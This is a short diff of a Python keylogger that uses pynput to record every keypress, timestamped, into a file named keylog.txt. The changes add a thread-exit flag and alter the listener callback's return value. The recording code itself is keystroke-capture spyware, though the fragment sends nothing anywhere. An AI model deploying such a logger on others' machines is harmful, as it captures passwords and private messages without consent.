@@ -2,6 +2,8 @@ from pynput.keyboard import Key, Listener
 import logging
 import time
 global listener_exit
+global end_thread
+end_thread = False
 listener_exit = False
 
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
@@ -14,7 +16,7 @@ def stop_listener():
 
 def on_press(key):
     if listener_exit:
-        return False
+        return 1
     logging.info(str(key))
 
 
